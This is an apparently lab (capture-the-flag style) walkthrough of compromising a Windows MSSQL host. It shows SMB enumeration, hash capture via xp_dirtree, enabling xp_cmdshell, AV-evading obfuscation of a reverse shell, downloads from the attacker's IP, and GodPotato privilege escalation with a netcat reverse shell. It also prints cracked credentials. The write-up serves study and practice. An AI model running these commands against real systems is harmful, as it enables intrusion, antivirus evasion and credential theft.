#Pwned! 
```IP
10.10.10.125
```
# Enumeration
## SMB
nxc doesn't work for some reason, but smbclient does:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241220113806.png?raw=true)
We can find an xlsm file inside the share:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241220114042.png?raw=true)
The file was created a user called Luis
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241220114517.png?raw=true)

## HTTP

# Exploitation
Let's try a phishing attack with a malicious xlsm
It wont work
It has already some macros, lets check them
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241220115218.png?raw=true)
We find a password
```
PcwTWTHRwryjc$c6
```
It seems to respond to our password
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241220120120.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241220120157.png?raw=true)
We can extract some more users and since what the macro is doing in an sql database connection we will try with impacket-mssql to connect to the database
```
impacket-mssqlclient Reporting@10.10.10.125 -windows-auth
```
We do some mssql enumerations but the databases doesn't seem to contain anything interesting. The users don't have hashes that we can crack, and we don't have xp_cmdshell in order to execute OS commands. Let's set up responder and try to get a call back with xp_dirtree in order to perform an smb relay attack:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241220120940.png?raw=true)
The command used being the following:
```
exec master.dbo.xp_dirtree '\\10.10.14.17\test'
```

And we get a hash for mssql-svc!
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241220121213.png?raw=true)
Let's crack the hash:
```
john --wordlist=/usr/share/wordlists/rockyou.txt files/mssql-svc.hash
```
And we get the following password:
```
corporate568
```
Let's try the new password on some services, the only one working will be mssql again
```
impacket-mssqlclient mssql-svc@10.10.10.125 -windows-auth
```
We have code execution
```
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```
```
EXEC master..xp_cmdshell 'whoami'
```
When tryint to upload and execute some reverse shell the AV prevents us to do so:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241220124742.png?raw=true)
We will need a tool to obfuscate the code
Let's create a nishang reverse shell and obfuscate it with https://github.com/JoelGMSec/Invoke-Stealth
Firstly we clone the repo and cd into it, and then copy the revshell into our directory and edit the contents of it to our IP and port:
```
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
```
And in a powershell we obfuscate it with the following command:
```
./Invoke-Stealth.ps1 ../rev.ps1 --technique PyFuscation
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241220130715.png?raw=true)
We transfer it with:
```
powershell wget http://10.10.14.17:8000/rev.ps1 -O C:\users\public\rev.ps1
```
And execute it with 
```
EXEC master..xp_cmdshell 'powershell  C:\users\public\rev.ps1'
```
We get first flag:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241220131625.png?raw=true)

# PrivEsc
## Manual
we have impersonate priv
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241220131529.png?raw=true)
Let's get a reverse shell with GodPotato
```
wget http://10.10.14.17/GodPotato-NET4.exe -O GodPotato-NET4.exe
```
```
wget http://10.10.14.17/nc64.exe -O nc.exe
```
```
.\GodPotato-NET4.exe -cmd ".\nc.exe -t -e C:\windows\system32\cmd.exe 10.10.14.17 1234"
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241220132214.png?raw=true)
## Automated

### Peass
### Mimikatz

# Lateral Movement


